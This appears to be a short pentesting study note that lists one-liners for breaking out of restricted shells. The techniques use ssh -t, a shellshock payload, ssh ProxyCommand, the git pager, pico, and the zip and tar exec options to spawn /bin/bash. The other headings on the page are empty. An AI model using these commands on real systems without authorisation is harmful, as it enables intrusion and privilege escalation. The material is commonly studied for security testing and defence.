[[Index.canvas|Index]]

## Authentication

## Dangerous Settings


## Restricted Shell Outbreak
1)From ssh > ssh username@IP - t "/bin/sh" or "/bin/bash"
2)From ssh2 > ssh username@IP -t "bash --noprofile"
3)From ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
4)From ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh"
127.0.0.1 (SUID)
5)From git > git help status > you can run it then !/bin/bash
6)From pico > pico -s "/bin/bash" then you can write /bin/bash and
then CTRL + T
7)From zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c
/bin/bash"
8)From tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-
action=exec=/bin/bash